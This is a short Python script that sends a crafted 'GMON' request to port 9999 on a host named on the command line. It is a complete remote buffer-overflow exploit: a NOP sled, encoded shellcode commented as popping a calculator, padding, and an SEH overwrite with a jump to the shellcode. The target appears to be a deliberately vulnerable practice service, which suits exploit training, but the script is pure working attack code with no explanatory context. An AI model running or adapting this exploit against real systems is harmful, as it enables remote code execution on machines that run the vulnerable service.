import socket, sys
from struct import pack

ip = sys.argv[1]
port = 9999

size = 0x1000

prefix = b'GMON '

# pop calc
nops = b"\x90" * 200
sc =  b""
sc += b"\xdb\xc3\xd9\x74\x24\xf4\x5d\x31\xc9\xb1\x31"
sc += b"\xb8\xa0\x9d\x69\xfa\x31\x45\x18\x83\xed\xfc"
sc += b"\x03\x45\xb4\x7f\x9c\x06\x5c\xfd\x5f\xf7\x9c"
sc += b"\x62\xe9\x12\xad\xa2\x8d\x57\x9d\x12\xc5\x3a"
sc += b"\x11\xd8\x8b\xae\xa2\xac\x03\xc0\x03\x1a\x72"
sc += b"\xef\x94\x37\x46\x6e\x16\x4a\x9b\x50\x27\x85"
sc += b"\xee\x91\x60\xf8\x03\xc3\x39\x76\xb1\xf4\x4e"
sc += b"\xc2\x0a\x7e\x1c\xc2\x0a\x63\xd4\xe5\x3b\x32"
sc += b"\x6f\xbc\x9b\xb4\xbc\xb4\x95\xae\xa1\xf1\x6c"
sc += b"\x44\x11\x8d\x6e\x8c\x68\x6e\xdc\xf1\x45\x9d"
sc += b"\x1c\x35\x61\x7e\x6b\x4f\x92\x03\x6c\x94\xe9"
sc += b"\xdf\xf9\x0f\x49\xab\x5a\xf4\x68\x78\x3c\x7f"
sc += b"\x66\x35\x4a\x27\x6a\xc8\x9f\x53\x96\x41\x1e"
sc += b"\xb4\x1f\x11\x05\x10\x44\xc1\x24\x01\x20\xa4"
sc += b"\x59\x51\x8b\x19\xfc\x19\x21\x4d\x8d\x43\x2f"
sc += b"\x90\x03\xfe\x1d\x92\x1b\x01\x31\xfb\x2a\x8a"
sc += b"\xde\x7c\xb3\x59\x9b\x63\x51\x48\xd1\x0b\xcc"
sc += b"\x19\x58\x56\xef\xf7\x9e\x6f\x6c\xf2\x5e\x94"
sc += b"\x6c\x77\x5b\xd0\x2a\x6b\x11\x49\xdf\x8b\x86"
sc += b"\x6a\xca\xef\x49\xf9\x96\xc1\xec\x79\x3c\x1e"

buffer = b'/' * (3487 - len(nops) - len(sc))
nseh = b'\xeb\x06\x90\x90'
seh = pack('<L', 0x625012f4)
jmp = b'\x66\x81\xC4\xDC\x05\xFF\xE4'


buffer2 = b'\x41' * (size - len(buffer))

payload = prefix + nops + sc + buffer + nseh + seh + jmp + buffer2 

try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(5)
        s.connect((ip, port))
        print('[*] Sending payload')
        s.send(payload)
        s.recv(1024)
except Exception as e:
    print(e)
    sys.exit(0)

